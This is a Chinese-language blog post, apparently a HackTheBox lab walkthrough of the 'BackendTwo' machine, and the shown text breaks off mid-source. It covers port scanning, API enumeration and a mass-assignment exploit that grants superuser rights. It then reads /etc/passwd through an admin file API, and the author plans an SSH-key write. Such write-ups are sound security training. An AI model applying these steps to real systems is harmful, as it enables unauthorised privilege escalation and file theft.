

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="https://raw.githubusercontent.com/Crazyinside/blog.image/main/material/20220804105159_83d6a.thumb.1000_0.jpg">
  <link rel="icon" href="https://raw.githubusercontent.com/Crazyinside/blog.image/main/material/20220804105159_83d6a.thumb.1000_0.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="CrazyInSide">
  <meta name="keywords" content="">
  
    <meta name="description" content="Recon:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051Crazy:~&#x2F;HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.11.162[sudo] crazyins">
<meta property="og:type" content="article">
<meta property="og:title" content="HTB Walkthrough - BackendTwo">
<meta property="og:url" content="https://crazyinside.github.io/post/HackTheBox-BackendTwo.html">
<meta property="og:site_name" content="Network Security Notes">
<meta property="og:description" content="Recon:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051Crazy:~&#x2F;HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.11.162[sudo] crazyins">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/BackendTwo.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828092318479.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828093139020.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828093233594.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828093347726.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828093815706.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828094018621.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828094628194.png">
<meta property="article:published_time" content="2023-08-13T22:39:08.988Z">
<meta property="article:modified_time" content="2023-08-11T16:43:26.890Z">
<meta property="article:author" content="World&#39;sEnd">
<meta property="article:tag" content="Linux">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/BackendTwo.png">
  
  
  
  <title>HTB Walkthrough - BackendTwo - Network Security Notes</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"crazyinside.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Fluid</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>Home</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>Archives</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>Categories</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>Tags</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://raw.githubusercontent.com/Crazyinside/blog.image/main/material/wallhaven-x6dj5z_3840x2160.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="HTB Walkthrough - BackendTwo"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-08-14 06:39" pubdate>
          August 14, 2023 am
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          28k words
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          237 mins
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">HTB Walkthrough - BackendTwo</h1>
            
            
              <div class="markdown-body">
                
                <p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/BackendTwo.png" srcset="/img/loading.gif" lazyload alt="BackendTwo"></p>
<h6 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.11.162<br>[sudo] crazyinside 的密码：<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-08-28 00:52:55 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 80/tcp on 10.10.11.162                                    <br>Discovered open port 22/tcp on 10.10.11.162  <br>Crazy:~/HackTheBox$ sudo nmap -sC -sV 10.10.11.162 -p80                              <br>[sudo] crazyinside 的密码：<br>Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-28 08:55 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.162<br>Host is up (0.086s latency).<br><br>PORT   STATE SERVICE VERSION<br>80/tcp open  http    uvicorn<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (application/json).</span><br><span class="hljs-string">|_http-server-header: uvicorn</span><br><span class="hljs-string">| fingerprint-strings: </span><br><span class="hljs-string">|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: </span><br><span class="hljs-string">|     HTTP/1.1 400 Bad Request</span><br><span class="hljs-string">|     content-type: text/plain; charset=utf-8</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|     Invalid HTTP request received.</span><br><span class="hljs-string">|   FourOhFourRequest: </span><br><span class="hljs-string">|     HTTP/1.1 404 Not Found</span><br><span class="hljs-string">|     date: Sun, 28 Aug 2022 00:55:40 GMT</span><br><span class="hljs-string">|     server: uvicorn</span><br><span class="hljs-string">|     content-length: 22</span><br><span class="hljs-string">|     content-type: application/json</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|     &#123;&quot;detail&quot;:&quot;Not Found&quot;&#125;</span><br><span class="hljs-string">|   GetRequest: </span><br><span class="hljs-string">|     HTTP/1.1 200 OK</span><br><span class="hljs-string">|     date: Sun, 28 Aug 2022 00:55:29 GMT</span><br><span class="hljs-string">|     server: uvicorn</span><br><span class="hljs-string">|     content-length: 22</span><br><span class="hljs-string">|     content-type: application/json</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|     &#123;&quot;msg&quot;:&quot;UHC Api v2.0&quot;&#125;</span><br><span class="hljs-string">|   HTTPOptions: </span><br><span class="hljs-string">|     HTTP/1.1 405 Method Not Allowed</span><br><span class="hljs-string">|     date: Sun, 28 Aug 2022 00:55:35 GMT</span><br><span class="hljs-string">|     server: uvicorn</span><br><span class="hljs-string">|     content-length: 31</span><br><span class="hljs-string">|     content-type: application/json</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|_    &#123;&quot;detail&quot;:&quot;Method Not Allowed&quot;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 68.04 seconds</span><br><span class="hljs-string">zsh: segmentation fault  sudo nmap -sC -sV 10.10.11.162 -p80</span><br></code></pre></td></tr></table></figure>

<p>一样的配方：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ feroxbuster -u http://10.10.11.162/                                        <br><br> ___  ___  __   __     __      __         __   ___<br>|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__<br>|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___<br>by Ben <span class="hljs-string">&quot;epi&quot;</span> Risher 🤓                 ver: 2.7.0<br>───────────────────────────┬──────────────────────<br> 🎯  Target Url            │ http://10.10.11.162/<br> 🚀  Threads               │ 50<br> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<br> 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]<br> 💥  Timeout (secs)        │ 7<br> 🦡  User-Agent            │ feroxbuster/2.7.0<br> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml<br> 🏁  HTTP methods          │ [GET]<br> 🔃  Recursion Depth       │ 4<br> 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest<br>───────────────────────────┴──────────────────────<br> 🏁  Press [ENTER] to use the Scan Management Menu™<br>──────────────────────────────────────────────────<br>200      GET        1l        3w       22c http://10.10.11.162/<br>401      GET        1l        2w       30c http://10.10.11.162/docs<br>200      GET        1l        1w       19c http://10.10.11.162/api<br>[<span class="hljs-comment">####################] - 2m     30000/30000   0s      found:3       errors:0      </span><br>[<span class="hljs-comment">####################] - 2m     30000/30000   235/s   http://10.10.11.162/ </span><br><br>Crazy:~/HackTheBox$ curl  http://10.10.11.162/docs<br><br>&#123;<span class="hljs-string">&quot;detail&quot;</span>:<span class="hljs-string">&quot;Not authenticated&quot;</span>&#125;                                                                                                                                                 <br>Crazy:~/HackTheBox$ curl http://10.10.11.162/api  <br>&#123;<span class="hljs-string">&quot;endpoints&quot;</span>:<span class="hljs-string">&quot;/v1&quot;</span>&#125;                                                                                                                                                 <br>Crazy:~/HackTheBox$ curl http://10.10.11.162/api/v1<br>&#123;<span class="hljs-string">&quot;endpoints&quot;</span>:[<span class="hljs-string">&quot;/user&quot;</span>,<span class="hljs-string">&quot;/admin&quot;</span>]&#125;                                                                                                                                                 <br>Crazy:~/HackTheBox$ curl http://10.10.11.162/api/v1/admin<br>                                                                                                                                                 <br>Crazy:~/HackTheBox$ curl http://10.10.11.162/api/v1/admin/<br>&#123;<span class="hljs-string">&quot;detail&quot;</span>:<span class="hljs-string">&quot;Not authenticated&quot;</span>&#125;                                                                                                                                                 <br>Crazy:~/HackTheBox$ curl http://10.10.11.162/api/v1/user/ <br>&#123;<span class="hljs-string">&quot;detail&quot;</span>:<span class="hljs-string">&quot;Not Found&quot;</span>&#125;                                                                                                                                                 <br>Crazy:~/HackTheBox$ curl http://10.10.11.162/api/v1/user/1<br>&#123;<span class="hljs-string">&quot;guid&quot;</span>:<span class="hljs-string">&quot;25d386cd-b808-4107-8d3a-4277a0443a6e&quot;</span>,<span class="hljs-string">&quot;email&quot;</span>:<span class="hljs-string">&quot;admin@backendtwo.htb&quot;</span>,<span class="hljs-string">&quot;profile&quot;</span>:<span class="hljs-string">&quot;UHC Admin&quot;</span>,<span class="hljs-string">&quot;last_update&quot;</span>:null,<span class="hljs-string">&quot;time_created&quot;</span>:1650987800991,<span class="hljs-string">&quot;is_superuser&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;id&quot;</span>:1&#125;                                                                                                                                                 <br>razy:~/HackTheBox$ curl http://10.10.11.162/api/v1/user/signup  -d <span class="hljs-string">&#x27;&#123;&quot;id&quot;:&quot;crazyinside&quot;&#125;&#x27;</span> -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> | jq .<br>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current<br>                                 Dload  Upload   Total   Spent    Left  Speed<br>100   189  100   169  100    20    648     76 --:--:-- --:--:-- --:--:--   724<br>&#123;<br>  <span class="hljs-string">&quot;detail&quot;</span>: [<br>    &#123;<br>      <span class="hljs-string">&quot;loc&quot;</span>: [<br>        <span class="hljs-string">&quot;body&quot;</span>,<br>        <span class="hljs-string">&quot;email&quot;</span><br>      ],<br>      <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;field required&quot;</span>,<br>      <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;value_error.missing&quot;</span><br>    &#125;,<br>    &#123;<br>      <span class="hljs-string">&quot;loc&quot;</span>: [<br>        <span class="hljs-string">&quot;body&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span><br>      ],<br>      <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;field required&quot;</span>,<br>      <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;value_error.missing&quot;</span><br>    &#125;<br>  ]<br>&#125;<br>                                                                                                                                                 <br>Crazy:~/HackTheBox$ curl http://10.10.11.162/api/v1/user/signup  -d <span class="hljs-string">&#x27;&#123;&quot;email&quot;:&quot;crazy@inside.htb&quot;,&quot;password&quot;:&quot;Password1!&quot;&#125;&#x27;</span> -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span>|jq .  <br>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current<br>                                 Dload  Upload   Total   Spent    Left  Speed<br>100    54  100     2  100    52      2     70  0:00:01 --:--:--  0:00:01    73<br>&#123;&#125;<br>                                                                                                                                                 <br>Crazy:~/HackTheBox$ curl http://10.10.11.162/api/v1/user/signup  -d <span class="hljs-string">&#x27;&#123;&quot;email&quot;:&quot;crazy@inside.htb&quot;,&quot;password&quot;:&quot;Password1!&quot;&#125;&#x27;</span> -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span>|jq .<br>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current<br>                                 Dload  Upload   Total   Spent    Left  Speed<br>100   121  100    69  100    52    269    202 --:--:-- --:--:-- --:--:--   472<br>&#123;<br>  <span class="hljs-string">&quot;detail&quot;</span>: <span class="hljs-string">&quot;The user with this username already exists in the system&quot;</span><br>&#125;<br>                                                                                                                                                 <br>Crazy:~/HackTheBox$ curl -s -X POST http://10.10.11.162/api/v1/user/login -d <span class="hljs-string">&quot;username=crazy@inside.htb&amp;password=Password1\!&quot;</span> |jq .<br>&#123;<br>  <span class="hljs-string">&quot;access_token&quot;</span>: <span class="hljs-string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzQwMTI1LCJpYXQiOjE2NjE2NDg5MjUsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6ImE3ZDFjY2NiLTYxMzQtNGY5MS1hMTM1LTMzYjY2YTJkNjUzYiJ9.XS6iyI0_QBAmNK19K4VgY2X8DgwQmjqRPMLAcrzHl6Y&quot;</span>,<br>  <span class="hljs-string">&quot;token_type&quot;</span>: <span class="hljs-string">&quot;bearer&quot;</span><br>&#125;<br>                                                                                                                                                 <br>Crazy:~/HackTheBox$ <br></code></pre></td></tr></table></figure>

<p>这里的后端页面与backend是一样的，只是在功能API上更新了一些，不再可以随意更改管理员密码了，当查询其他用户信息时会鉴权，但是新出了一个编辑用户配置文件的API。<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828092318479.png" srcset="/img/loading.gif" lazyload alt="image-20220828092318479"></p>
<p>有一个批量分配的漏洞。可以更改json格式存储用户信息的字段。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl http://10.10.11.162/api/v1/user/12<br>&#123;<span class="hljs-string">&quot;guid&quot;</span>:<span class="hljs-string">&quot;a7d1cccb-6134-4f91-a135-33b66a2d653b&quot;</span>,<span class="hljs-string">&quot;email&quot;</span>:<span class="hljs-string">&quot;crazy@inside.htb&quot;</span>,<span class="hljs-string">&quot;profile&quot;</span>:null,<span class="hljs-string">&quot;last_update&quot;</span>:null,<span class="hljs-string">&quot;time_created&quot;</span>:1661648753362,<span class="hljs-string">&quot;is_superuser&quot;</span>:<span class="hljs-literal">false</span>,<span class="hljs-string">&quot;id&quot;</span>:12&#125;  <br></code></pre></td></tr></table></figure>

<p>鉴权的字段我猜测是is_superuser，它是false，我需要将他改为true</p>
<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828093139020.png" srcset="/img/loading.gif" lazyload alt="image-20220828093139020"></p>
<p>返回了两百，好像是对了？</p>
<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828093233594.png" srcset="/img/loading.gif" lazyload alt="image-20220828093233594"></p>
<p>通过查询可以看到确实如此。这次是没有命令执行功能的，但是可以写文件：</p>
<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828093347726.png" srcset="/img/loading.gif" lazyload alt="image-20220828093347726"></p>
<p>写文件最好的方式便是写ssh秘钥了。不过首先需要知道目标有哪些用户，读取文件API有提示说是base64_url编码文件名：</p>
<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828093815706.png" srcset="/img/loading.gif" lazyload alt="image-20220828093815706"></p>
<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828094018621.png" srcset="/img/loading.gif" lazyload alt="image-20220828094018621"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl -X <span class="hljs-string">&#x27;GET&#x27;</span> \<br>  <span class="hljs-string">&#x27;http://10.10.11.162/api/v1/admin/file/L2V0Yy9wYXNzd2Q&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;accept: application/json&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzQxNTI5LCJpYXQiOjE2NjE2NTAzMjksInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiYTdkMWNjY2ItNjEzNC00ZjkxLWExMzUtMzNiNjZhMmQ2NTNiIn0.oMAp9euGXoknNfwl8YKkDa4jWOk8BbylF7V8X2WoWFY&#x27;</span> -s |jq .<br>&#123;<br>  <span class="hljs-string">&quot;file&quot;</span>: <span class="hljs-string">&quot;root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nsshd:x:112:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nhtb:x:1000:1000:htb:/home/htb:/bin/bash\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\n&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>能够被用来登录的普通用户应该是htb，而且没有现成的秘钥可读。但是当我尝试写文件，会像上次提示的一样，需要debug标志：</p>
<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828094628194.png" srcset="/img/loading.gif" lazyload alt="image-20220828094628194"></p>
<p>一路谷歌顺藤摸瓜摸索到源码&#x2F;home&#x2F;htb&#x2F;app&#x2F;core&#x2F;config.py。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> AnyHttpUrl, BaseSettings, EmailStr, validator<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>, <span class="hljs-type">Optional</span>, <span class="hljs-type">Union</span><br><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> enum <span class="hljs-keyword">import</span> Enum<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Settings</span>(<span class="hljs-title class_ inherited__">BaseSettings</span>):<br>    API_V1_STR: <span class="hljs-built_in">str</span> = <span 